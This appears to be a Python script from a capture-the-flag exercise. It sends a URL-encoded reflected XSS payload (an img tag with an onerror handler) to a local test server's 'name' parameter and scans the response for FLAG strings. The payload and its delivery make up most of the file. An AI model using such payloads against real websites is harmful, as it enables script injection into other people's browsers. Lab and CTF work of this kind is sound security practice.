import requests
import urllib.parse
import re

# Try GET with URL-encoded payload
base_url = "http://127.0.0.1:33203/page"
payload = "<img src=x onerror=alert('XSS')>"

# URL encode the entire payload
encoded_payload = urllib.parse.quote(payload)
full_url = f"{base_url}?name={encoded_payload}"

print(f"[+] GET request with URL-encoded payload:")
print(f"[+] Final URL: {full_url}")

response = requests.get(full_url)

print(f"\n[+] Response Status Code: {response.status_code}")
print(f"[+] Response Headers:\n{dict(response.headers)}")
print(f"[+] Response Body (Full):\n{'='*80}")
print(response.text)
print(f"\n{'='*80}")

# Search for FLAG{ patterns
flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
print(f"[+] FLAG Search Results:")
if flag_matches:
    for i, flag in enumerate(flag_matches, 1):
        print(f"[!] FLAG FOUND #{i}: {flag}")
else:
    print("[-] No FLAG{ pattern found in response")

# Look for payload reflection (in any form - encoded or decoded)
